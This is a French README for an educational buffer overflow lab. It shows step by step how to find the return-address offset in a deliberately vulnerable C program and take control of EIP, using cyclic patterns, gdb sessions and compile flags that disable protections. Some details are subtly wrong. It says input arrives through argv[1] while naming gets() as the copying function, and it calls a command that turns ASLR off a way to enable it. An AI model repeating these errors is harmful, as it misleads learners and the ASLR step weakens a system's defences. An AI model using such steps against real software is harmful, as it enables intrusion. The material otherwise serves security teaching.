# 🔥 Buffer Overflow Lab — Démonstration pédagogique (C / x86)

Ce dépôt présente **une vulnérabilité de type Buffer Overflow** sur un petit programme C volontairement vulnérable.  
L’objectif est **d’expliquer clairement** la vulnérabilité, **montrer ma démarche d’analyse**, et **mettre en avant mes compétences en sécurité applicative / exploitation**.

---

📄 Disclaimer

Ce code est destiné uniquement à la formation, dans un environnement contrôlé.
Il n’est pas destiné à être utilisé en conditions réelles.

## 🎯 Objectifs pédagogiques

- Comprendre un débordement de tampon sur la pile (stack-based buffer overflow).
- Voir comment une donnée contrôlée par l’utilisateur (ici `argv[1]`) peut écraser la mémoire adjacente.
- Observer le comportement via `gdb` / `pwndbg`.
- Montrer une démarche rigoureuse que j’applique aux audits et challenges CTF.

---

## 🧠 Mon raisonnement

### 1. Choisir un pattern vulnérable
Pour démontrer un buffer overflow, j’ai délibérément utilisé :

- un **buffer trop petit** ;
- une **fonction dangereuse** (`gets()`), qui ne vérifie pas la taille ;
- une **variable critique à proximité sur la stack**.

Cela simule parfaitement les erreurs courantes en C, encore présentes dans d’anciens systèmes ou du code legacy.

### 2. Rendre la vulnérabilité exploitable
Le programme récupère l’input utilisateur via :

./vuln "$(python3 -c 'print("A"*100)')"


ou une chaîne directement fournie par l’attaquant.

Cette chaîne est **copiée sans contrôle** dans un buffer de 32 octets → overflow garanti.

### 3. Observer l’impact avec gdb
Une fois compilé sans protections :

make
gdb ./vuln
run $(python3 -c 'print("A"*80)')

On visualise alors :

- l’écrasement de l’EIP/RIP (selon architecture),
- la disposition de la stack,
- les registres modifiés.


### 🔥 Exploitation pas-à-pas : calcul de l’offset (pattern-create / pattern-offset)

Cette section montre comment exploiter le programme vulnérable étape par étape, exactement comme en audit sécurité ou CTF.

#### 🧩 Étape 1 — Générer un pattern unique

L’objectif est de déterminer après combien d’octets le programme écrase le pointeur de retour (EIP/RIP).
On utilise un cyclic pattern qui permet de retrouver précisément l’offset du crash.

##### Méthode 1 — Metasploit (msf-pattern_create)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

##### Méthode 2 — Pwntools
python3 - <<EOF
from pwn import *
print(cyclic(200))
EOF


Copiez la chaîne générée, par exemple :

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3...

#### 🧭 Étape 2 — Lancer le programme avec ce pattern
./vuln $(python3 -c 'from pwn import *; print(cyclic(200))')


Le programme plante :

Segmentation fault (core dumped)


Parfait : on a écrasé quelque chose d’important.

##### 🧠 Étape 3 — Identifier l’EIP écrasé (sur x86) ou RIP (x64)

Ouvrir dans gdb :

gdb ./vuln
(gdb) run $(python3 -c 'from pwn import *; print(cyclic(200))')


Lors du crash :

Program received signal SIGSEGV
EIP: 0x35624134


Note la valeur de l’EIP/RIP.
Exemple ici : 0x35624134.

#### 🎯 Étape 4 — Calculer l’offset précis
Méthode Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35624134

Méthode Pwntools (recommandée)
python3 - <<EOF
from pwn import *
print(cyclic_find(0x35624134))
EOF


Résultat exemple :

32


👉 Cela signifie que l’EIP est écrasé après exactement 32 octets.

Ce nombre correspond à la taille du buffer vulnérable (char buffer[32]), ce qui confirme l’analyse.

#### 🧪 Étape 5 — Vérifier que l’on contrôle bien l’EIP/RIP

Maintenant qu’on connaît l’offset, on envoie une charge utile structurée :

./vuln $(python3 -c 'print("A"*32 + "BBBB")')


Dans gdb, l’EIP devrait valoir :

0x42424242  ('BBBB')

gdb ./vuln
(gdb) run $(python3 -c 'print("A"*32 + "BBBB")')
Program received signal SIGSEGV
EIP: 0x42424242


✔️ Succès : on contrôle le pointeur d’exécution.
C’est l’étape clé d’un buffer overflow exploitable.



### 4. Conclusion
L’exploitation d’un buffer overflow n’est pas seulement un exercice offensif.  
Elle permet de comprendre **pourquoi les protections modernes existent** (ASLR, NX, Stack Canary, RELRO…).

### 5. Compilation
Sans les protections de sécurité (mode démonstration)
gcc vulnerable.c -o vuln -fno-stack-protector -z execstack


Vous pouvez activer l’ASLR systématiquement pour vos tests :

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

---